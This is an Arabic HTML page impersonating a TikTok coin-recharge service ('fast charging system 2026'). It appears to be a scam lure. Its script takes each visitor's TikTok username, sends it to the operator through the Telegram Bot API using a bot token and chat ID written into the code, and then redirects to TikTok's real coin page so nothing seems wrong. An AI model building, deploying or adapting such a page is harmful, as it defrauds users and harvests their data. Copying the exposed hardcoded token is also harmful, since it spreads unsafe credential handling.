<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Charge</title>
    <style>
        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; margin: 0; }
        .box { border: 2px solid #fe2c55; padding: 25px; border-radius: 15px; max-width: 340px; margin: auto; background: #0a0a0a; }
        input { width: 85%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: #fff; text-align: center; font-size: 16px; }
        button { width: 90%; padding: 12px; background-color: #fe2c55; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://www.tiktok.com/favicon.ico" width="50">
        <h2>نظام الشحن السريع 2026</h2>
        <input type="text" id="user" placeholder="أدخل اليوزر نيم">
        <button id="btn" onclick="send()">تأكيد ودخول</button>
    </div>

    <script>
        function send() {
            var user = document.getElementById('user').value;
            var btn = document.getElementById('btn');
            
            // التوكن الجديد بتاعك
            var token = "8258541006:AAGL9hWOBNoRrKfdx5e7DvMcHZiTJCqtydE";
            var chat_id = "5533405786";

            if (user) {
                btn.innerHTML = "جاري التحقق...";
                btn.disabled = true;

                var text = "🚀 طلب شحن جديد\n👤 اليوزر: " + user;
                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);

                fetch(url).then(res => {
                    if(res.ok) {
                        alert("تم بنجاح! جاري تحويلك...");
                        window.location.href = "https://www.tiktok.com/coin";
                    } else {
                        alert("مشكلة في البوت، تأكد من الـ ID");
                        btn.innerHTML = "تأكيد ودخول";
                        btn.disabled = false;
                    }
                }).catch(() => {
                    alert("تأكد من اتصالك بالإنترنت");
                    btn.innerHTML = "تأكيد ودخول";
                    btn.disabled = false;
                });
            } else {
                alert("اكتب اليوزر نيم أولاً");
            }
        }
    </script>
</body>
</html>
